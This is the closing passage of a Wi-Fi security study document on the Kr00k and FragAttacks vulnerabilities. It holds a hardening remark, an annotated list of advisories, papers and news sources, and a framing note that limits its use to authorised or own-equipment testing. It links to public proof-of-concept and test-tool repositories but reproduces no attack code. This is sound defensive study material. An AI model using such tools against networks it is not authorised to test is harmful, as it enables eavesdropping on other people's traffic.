- **Correct the common myth in your own notes:** WPA3/PMF/EAP-TLS are *not* a FragAttacks fix.
  Patching + E2E encryption + LAN/DNS hardening is the posture.

---

## 7. Sources (URLs actually used this pass)

**Kr00k (CVE-2019-15126) & Beyond Kr00k**
- ESET white paper — *Kr00k: CVE-2019-15126 — Serious Vulnerability Deep Inside Your Wi-Fi Encryption* (Čermák, Svorenčík, Lipovský, Feb 2020): https://telepolis.pl/images/2020/02/ESET_Kr00k.pdf
- ESET WeLiveSecurity — *KrØØk: Serious vulnerability affected encryption of billion+ Wi-Fi devices*: https://www.welivesecurity.com/2020/02/26/krook-serious-vulnerability-affected-encryption-billion-wifi-devices/
- ESET WeLiveSecurity — *Beyond KrØØk: Even more Wi-Fi chips vulnerable to eavesdropping* (Qualcomm CVE-2020-3702, MediaTek): https://www.welivesecurity.com/2020/08/06/beyond-kr00k-even-more-wifi-chips-vulnerable-eavesdropping/
- ESET press release — *ESET discovers Kr00k: Communications of a billion+ devices were at risk*: https://www.eset.com/int/about/newsroom/press-releases/research/eset-discovers-kr00k-communications-of-a-billion-devices-were-at-risk-1/
- ESET official test script — `eset/malware-research/kr00k`: https://github.com/eset/malware-research/tree/master/kr00k
- `akabe1/kr00ker` — Kr00k PoC (Maurizio Siddu), flags + SNAP-header decrypt check (README fetched): https://github.com/akabe1/kr00ker
- Wiz Vulnerability DB — CVE-2019-15126: https://www.wiz.io/vulnerability-database/cve/cve-2019-15126
- Help Net Security — *Flaw affecting 1B+ Wi-Fi devices allows attackers to decrypt packets*: https://www.helpnetsecurity.com/2020/02/27/cve-2019-15126/
- Threatpost — *Billions of Devices Open to Wi-Fi Eavesdropping (Kr00k)*: https://threatpost.com/billions-of-devices-wifi-encryption-hack/153267/
- SecurityWeek — *Kr00k Vulnerability Exposed Data From Over a Billion Wi-Fi Devices*: https://www.securityweek.com/kr00k-vulnerability-exposed-data-over-billion-wi-fi-devices/
- Security Affairs — *Kr00k Wi-Fi encryption flaw*: https://securityaffairs.com/98516/hacking/kr00k-wi-fi-encryption-flaw.html
- The Register — *Billion-plus Wi-Fi devices susceptible to Kr00k*: https://www.theregister.com/2020/02/27/wifi_chip_bug_eset/
- Cisco Meraki — *FullMAC Wi-Fi chipsets vulnerability (kr00k)* (firmware-only fix; HTTPS/VPN stays safe): https://documentation.meraki.com/General_Administration/Privacy_and_Security/FullMAC_Wi-Fi_chipsets_vulnerability_(kr00k)
- Ezurio (Laird) — *Does the Kr00k vulnerability impact the 40-series radios?* (BCM4329 unpatched; use TLS): https://www.ezurio.com/support/faqs/does-kr00k-vulnerability-have-impact-40-series-radios

**FragAttacks (12 CVEs)**
- FragAttacks official site (Mathy Vanhoef) — demos, CVE descriptions, defenses (fetched): https://www.fragattacks.com/
- `vanhoefm/fragattacks` — official `fragattack.py` tool + README: full test matrix, action grammar, driver/card notes, result interpretation (README fetched): https://github.com/vanhoefm/fragattacks
- `vanhoefm/fragattacks-drivers58` — patched-driver tree for mixed mode: https://github.com/vanhoefm/fragattacks-drivers58
- Vanhoef — *Fragment and Forge: Breaking Wi-Fi Through Frame Aggregation and Fragmentation* (USENIX Security '21): https://www.usenix.org/conference/usenixsecurity21/presentation/vanhoef
- USENIX paper PDF: https://papers.mathyvanhoef.com/usenix2021.pdf
- IACR ePrint 2021/763 (paper record): https://eprint.iacr.org/2021/763
- Vanhoef — FragAttacks vendor/overview PDF (attack chains, CVE taxonomy): https://papers.mathyvanhoef.com/fragattacks-overview.pdf
- Vanhoef — FragAttacks summary slides: https://papers.mathyvanhoef.com/fragattacks-slides-summary-2021-03-8.pdf
- Malwarebytes Labs — *FragAttack: New Wi-Fi vulnerabilities that affect… basically everything*: https://www.malwarebytes.com/blog/news/2021/05/fragattack-new-wi-fi-vulnerabilities-that-affect-basically-everything
- Duo Decipher — *FragAttacks Bugs Plague Wi-Fi Devices*: https://duo.com/decipher/fragattacks-bugs-plague-wi-fi-devices
- Dark Reading — *FragAttacks Foil 2 Decades of Wireless Security*: https://www.darkreading.com/iot/fragattacks-foil-2-decades-of-wireless-security
- The Record — *Wi-Fi devices going back to 1997 vulnerable to new Frag Attacks*: https://therecord.media/wifi-devices-going-back-to-1997-vulnerable-to-new-frag-attacks/
- The Register — FragAttacks coverage incl. CVE list / TKIP-MIC note (CVE-2020-26141): https://www.theregister.com/2021/05/12/krack_hack_wifi/
- Microchip — FragAttacks software vulnerability response (fw versions; WPA3+PMF note): https://www.microchip.com/en-us/products/wireless-connectivity/software-vulnerability-response/fragattacks

---

*Framing: authorized / own-gear / OSWP study / sanctioned CTF only. Every PoC here is a
patch-verification tool; the deliverable is the hardening in §5. For evil-twin-style injection
coverage this document stays at detection + concept — no credential harvester is built. Point
nothing at a BSSID or client that is not on your allowlist.*
